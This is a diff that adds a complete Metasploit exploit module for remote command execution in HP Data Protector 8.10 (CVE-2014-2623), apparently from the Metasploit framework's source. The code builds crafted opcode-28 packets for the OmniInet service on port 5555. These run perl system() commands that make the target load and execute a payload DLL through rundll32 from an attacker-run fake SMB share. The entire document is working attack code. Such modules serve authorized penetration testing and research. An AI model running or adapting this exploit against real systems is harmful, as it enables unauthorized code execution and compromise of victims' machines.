@@ -1,0 +1,151 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::SMB::Server::Share
+  include Msf::Exploit::EXE
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'HP Data Protector 8.10 Remote Command Execution',
+      'Description'    => %q{
+        This module exploits a remote command execution on HP Data Protector 8.10. Arbitrary
+        commands can be execute by sending crafted requests with opcode 28 to the OmniInet
+        service listening on the TCP/5555 port. Since there is an strict length limitation on
+        the command, rundll32.exe is executed, and the payload is provided through a DLL by a
+        fake SMB server. This module has been tested successfully on HP Data Protector 8.1 on
+        Windows 7 SP1.
+      },
+      'Author'         => [
+        'Christian Ramirez', # POC
+        'Henoch Barrera', # POC
+        'Matthew Hall <hallm[at]sec-1.com>' # Metasploit Module
+      ],
+      'References'     =>
+        [
+          ['CVE', '2014-2623'],
+          ['OSVDB', '109069'],
+          ['EDB', '34066'],
+          ['URL', 'https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818']
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread',
+        },
+      'Payload'        =>
+        {
+          'Space'       => 2048,
+          'DisableNops' => true
+        },
+      'Privileged'     => true,
+      'Platform'       => 'win',
+      'Stance'         => Msf::Exploit::Stance::Aggressive,
+      'Targets'        =>
+        [
+          [ 'HP Data Protector 8.10 / Windows', { } ],
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Nov 02 2014'))
+
+      register_options(
+        [
+          Opt::RPORT(5555),
+          OptString.new('FILE_NAME', [ false, 'DLL File name to share']),
+          OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 15])
+        ], self.class)
+
+      deregister_options('FOLDER_NAME')
+      deregister_options('FILE_CONTENTS')
+  end
+
+  def check
+    fingerprint = get_fingerprint
+
+    if fingerprint.nil?
+      return Exploit::CheckCode::Unknown
+    end
+
+    print_status("#{peer} - HP Data Protector version #{fingerprint}")
+
+    if fingerprint =~ /HP Data Protector A\.08\.(\d+)/
+      minor = $1.to_i
+    else
+      return Exploit::CheckCode::Safe
+    end
+
+    if minor < 11
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Detected
+  end
+
+  def peer
+    "#{rhost}:#{rport}"
+  end
+
+  def get_fingerprint
+    ommni = connect
+    ommni.put(rand_text_alpha_upper(64))
+    resp = ommni.get_once(-1)
+    disconnect
+
+    if resp.nil?
+      return nil
+    end
+
+    Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last null
+  end
+
+  def send_pkt(cmd)
+    cmd.gsub!("\\", "\\\\\\\\")
+
+    pkt = "2\x00"
+    pkt << "\x01\x01\x01\x01\x01\x01\x00"
+    pkt << "\x01\x00"
+    pkt << "\x01\x00"
+    pkt << "\x01\x00"
+    pkt << "\x01\x01\x00 "
+    pkt << "28\x00"
+    pkt << "\\perl.exe\x00 "
+    pkt << "-esystem('#{cmd}')\x00"
+
+    connect
+    sock.put([pkt.length].pack('N') + pkt)
+    disconnect
+  end
+
+  def primer
+    self.file_contents = generate_payload_dll
+    print_status("File available on #{unc}...")
+
+    print_status("#{peer} - Trying to execute remote DLL...")
+    sploit = "rundll32.exe #{unc},#{rand_text_numeric(1)}"
+    send_pkt(sploit)
+  end
+
+  def setup
+    super
+
+    self.file_name = datastore['FILE_NAME'] || "#{Rex::Text.rand_text_alpha(4 + rand(3))}.dll"
+
+    unless file_name =~ /\.dll$/
+      fail_with(Failure::BadConfig, "FILE_NAME must end with .dll")
+    end
+  end
+
+  def exploit
+    begin
+      Timeout.timeout(datastore['SMB_DELAY']) {super}
+    rescue Timeout::Error
+      # do nothing... just finish exploit and stop smb server...
+    end
+  end
+end
